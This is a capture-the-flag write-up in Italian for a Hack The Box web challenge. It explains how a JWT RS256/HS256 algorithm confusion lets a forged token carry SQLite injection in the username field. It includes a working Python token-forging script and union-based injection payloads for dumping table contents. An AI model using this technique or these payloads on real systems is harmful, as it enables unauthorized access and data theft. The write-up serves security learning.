## Information Gathering

Vedo una web app molto basica con un form di login (con la possibilità di registrare utenti), quindi post-login una home page molto basilare in cui viene plottato il nome con cui mi sono registrato. 

## Testing Entry Points

Inizio a testare i vari entry points che ho rintracciato, partendo con le vulnerabilità della tipologia SQLinjection, XSS ed XXE. Vedo che tuttavia nulla funziona. 

A questo punto scarico il codice sorgente della web app disponibile da hackthebox. Lo carico su WebStorm, effettuo tutte le connessioni al DB, Node, ecc... Quindi eseguo in localhost ma non noto niente di particolare... A questo punto leggo il codice sorgente alla ricerca di vulnerabilità e vedo che:

 * la verifica del JWT avviene tramite RS256 ma anche HS256
 * la ricerca dell'username a DB tramite JWT avviene in maniera incontrollata
 
 Da questo comprendo che:
 
  * posso usare la chiave pubblica (nascosta dentro al payload del JWT) per firmare JWT validi con metodo HS256
  * posso inserire sintassi per eseguire sqlinjection dentro al campo username
  
## Exploitation

Con i rilevamenti descritti nel punto precedente sono in grado di scrivere il seguente script in Python:

```
import jwt
import requests

public = open('key.pem', 'r').read()

while 1:

  payload = raw_input("Payload: ")

  jwt_res = jwt.encode({"username":payload}, key=public, algorithm='HS256')

  header = {"Cookie": "session="+jwt_res}

  r = requests.get('http://docker.hackthebox.eu:32435/', headers=header)

  print r.text

```

 * il file "key.pem" contiene la chiave pubblica in forma corretta estratta dal JWT
 * nel cookie inserisco il JWT craftato con la query
 
A questo punto estraggo il numero delle tabelle presenti, il loro nome, le colonne presenti nella tabella che mi interessa ed infine i valori presenti nella tabella di mio interesse (ricordando di effettuare l'escape del carattere ', altrimenti interpretato da python) - Fonte [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md):

```
* ABC\' order by 6 --
* ABC\' union SELECT 1,sql,3 FROM sqlite_master WHERE type!=\'meta\' AND sql NOT NULL AND name NOT LIKE \'sqlite_%\' AND name=\'<TABLE>\' --
* ABC\' union SELECT 1,<COLUMN>,3 FROM <TABLE> --
```

Ed ecco il flag! 
